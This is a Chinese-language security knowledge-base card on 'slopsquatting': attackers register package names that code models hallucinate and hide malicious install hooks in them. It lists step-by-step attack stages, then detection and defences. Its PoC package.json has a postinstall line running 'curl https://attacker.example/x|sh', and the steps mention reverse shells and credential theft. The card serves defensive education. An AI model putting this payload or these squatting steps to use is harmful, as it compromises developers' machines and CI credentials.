---
id: ai-security-supply-chain-slopsquatting-hallucinated-package-registration
title: Slopsquatting：抢占模型幻觉出的包名，诱导开发者安装恶意依赖
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: slopsquatting-hallucinated-package-name
aliases:
- slopsquatting
- 幻觉包名抢注
- AI 幻觉依赖投毒
- package hallucination
- 幻想依赖供应链攻击
tags:
- ai-security
- supply-chain
- slopsquatting
- package-hallucination
- npm
- pypi
- dependency
- postinstall
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V107
  verified_at: '2026-11-05T22:34:37+08:00'
  notes: 已对照原文（OWASP GenAI LLM Top 10 2026 中文翻译）与4张图核对：机制、码位范围/渲染外联链、slopsquatting 研究引用、嵌入反演数值与事件引用均与原文条目一致；卡片已自述无原文可执行 PoC、confidence=medium，属机制级场景卡。未验证点：原文为风险框架翻译而非漏洞 writeup，未提供目标环境/完整载荷；本库未复跑任何 PoC；frontmatter 无 sources/source_url（正文参考文献含来源）。
---

## 一句话结论

代码生成模型会稳定地“幻觉”出看似合理但并不存在的包名；攻击者批量收集这些名称并抢先在 npm/PyPI 等仓库注册恶意包，开发者按模型建议安装依赖后，包的 `postinstall` 或导入期代码即以开发者/CI 权限执行，形成一条不依赖提示词注入的 AI 供应链攻击链。

## 原理

- **模型会产生可复现的幻觉包名**：LLM 生成代码时按语言生态的命名习惯补全依赖，遇到训练数据中不存在的功能时仍会给出“看起来很像真的”的包名（如 `demo-date-util`、`fast-json-helper`）；同一类任务在多次生成中往往重复同一批幻觉名称，原文引用 Spracklen 等人的研究指出这类名称可被系统性地收集。
- **攻击者只需抢注**：攻击者用大量 prompt 让模型生成依赖清单，筛选出在 registry 中不存在但出现频率高的名称，然后抢先注册同名包。包本身可以伪装成正常工具，在 `postinstall`（npm）、`setup.py`/`pyproject` 构建钩子或首次 import 时执行任意代码，并继续下载二阶段载荷。
- **开发者为什么会上钩**：模型输出被当作“专家建议”，开发者可能直接复制 `npm install <name>` / `pip install <name>`；IDE/CI 的自动安装、依赖机器人、脚手架模板会进一步放大；包名本身正常、仓库元数据齐全时，人工 review 很难发现它是攻击者注册的。
- **与提示词注入的区别**：这里不需要攻击者控制模型上下文，也不需要模型被“越狱”；模型是在正常完成任务时自发产生不存在的名称。攻击者利用的是模型输出的可信度与包管理器的自动执行语义。
- **与 typosquatting/依赖混淆的区别**：typosquatting 仿冒已有包名，依赖混淆利用私有/公共仓库同名解析；slopsquatting 的入口是“模型凭空生成、registry 原本不存在”的名称，攻击者可以提前布局，等待开发者按 AI 建议安装。
- **边界**：需要开发者/CI 实际安装该包；若组织强制使用私有 registry、允许列表、锁文件并禁用安装脚本，攻击失败。包的下载量、维护者信息、发布时间等信号可用于识别新注册的恶意包。

## 触发条件

- 开发者使用 LLM/代码助手生成代码或依赖清单，并直接采纳其中未经验证的包名。
- 包管理器允许从公共 registry 安装，且默认执行生命周期脚本（npm `postinstall`、pip 构建后端等）。
- 组织没有依赖允许列表、私有镜像/代理、锁文件校验或新包人工审核。
- 攻击者能提前注册包名，并能把恶意包伪装成正常工具（README、版本号、维护者信息）。
- CI/CD 使用模型生成的依赖自动安装，或依赖更新机器人自动合并。

## 利用步骤

1. 用多组 prompt 让代码模型生成常见任务的依赖清单（日期处理、HTTP 客户端、日志、CLI 工具等），收集模型给出的包名。
2. 在 npm/PyPI 等 registry 查询这些名称，筛出不存在但反复出现的“幻觉包名”，优先选择听起来通用、下载价值高的名称。
3. 抢注同名包：填写正常的描述/版本/README，加入 `postinstall` 或导入期 payload（反弹 shell、窃取环境变量/云凭据、下载二阶段）。
4. 等待开发者按模型建议安装；可通过包名关键词、issue/论坛中的 AI 回答、公开代码搜索寻找潜在受害者。
5. 包被执行后，攻击者获得开发者或 CI 权限；可进一步窃取 token、修改流水线、投放更多包。
6. 若目标组织使用私有 registry，可尝试 dependency confusion/同名覆盖；若使用锁文件，等待版本更新或诱导升级。

## PoC

原文未给出可直接执行的恶意包，以下为机制示意（未上传、未执行）：

```json
{
  "name": "demo-date-util",
  "version": "1.0.0",
  "description": "A tiny date formatting helper.",
  "scripts": {
    "postinstall": "node -e \"require('child_process').exec('curl https://attacker.example/x|sh')\""
  }
}
```

```text
# 攻击者侧流程（示意）
# 1) 让模型生成依赖清单，例如：
#    "give me a package.json for a React date picker using common npm packages"
# 2) 提取模型反复给出但 registry 不存在的包名
# 3) npm view <name>  # 404 -> 可抢注
# 4) 注册同名包并发布带 postinstall 的版本
# 5) 等待开发者执行 npm install <name>
```

## 变体与关联

- **变体**：typosquatting（拼写仿冒真实包）、dependency confusion（私有/公共同名）、namespace/scope 抢注、模型从训练数据复现已删除包名、AI 生成代码直接引用不存在的 import。
- **投递变体**：npm `postinstall`/`preinstall`、PyPI `setup.py`/构建后端、Go module `init`、RubyGems 扩展、VS Code 扩展/插件市场。
- **关联卡片**：[[ai-security-supply-chain-ai-codegen-prompt-npm-install-rce]]（Prompt 诱导 AI 代码平台安装恶意 npm 包，属提示词注入路径）、[[ai-security-agent-security-zcode-trust-folder-plugin-mcp-admission-bypass]]（仓库配置自动执行类供应链风险）。
- **边界**：原文只给出概念、研究引用与风险场景，未给出实际恶意包或投放数据；置信度定为 medium，实际成功率取决于模型/生态/组织依赖策略。

## 检测与防御

- **依赖治理**：对模型建议的每个包先验证“存在性 + 维护者 + 下载量 + 发布时间 + 仓库链接”，新注册/低下载/无源码的包进入人工审核；使用私有 registry/代理和允许列表。
- **安装加固**：CI 使用锁文件与 `npm ci`，默认 `--ignore-scripts`；pip 使用 `--no-build-isolation`/受控构建环境；容器内安装、最小权限、网络出站限制。
- **开发流程**：在代码审查中标记 AI 生成的新依赖；禁止直接复制模型输出的安装命令；依赖更新机器人只接受白名单来源。
- **检测**：监控新注册且名称与 AI 常见幻觉模式匹配的包；扫描依赖清单中的不存在/新包；告警 `postinstall`/构建期网络请求；维护 SBOM 与来源证明。
- **响应**：发现恶意包后锁定版本、清理缓存、轮换 CI/云凭据、审计安装过该包的构建机与开发者终端。
